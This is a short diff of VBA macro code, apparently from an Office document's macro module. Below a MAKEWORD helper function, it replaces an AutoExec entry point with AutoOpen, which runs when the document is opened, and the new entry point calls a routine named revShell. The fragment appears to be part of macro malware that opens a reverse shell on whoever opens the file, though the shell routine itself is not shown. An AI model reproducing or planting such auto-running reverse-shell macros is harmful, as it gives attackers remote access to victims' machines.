@@ -167,10 +167,8 @@ Public Function MAKEWORD(Lo As Byte, Hi As Byte) As Integer
 End Function
 
 
+Sub AutoOpen()
 
-
-
-
-Public Sub AutoExec()
     revShell
+
 End Sub
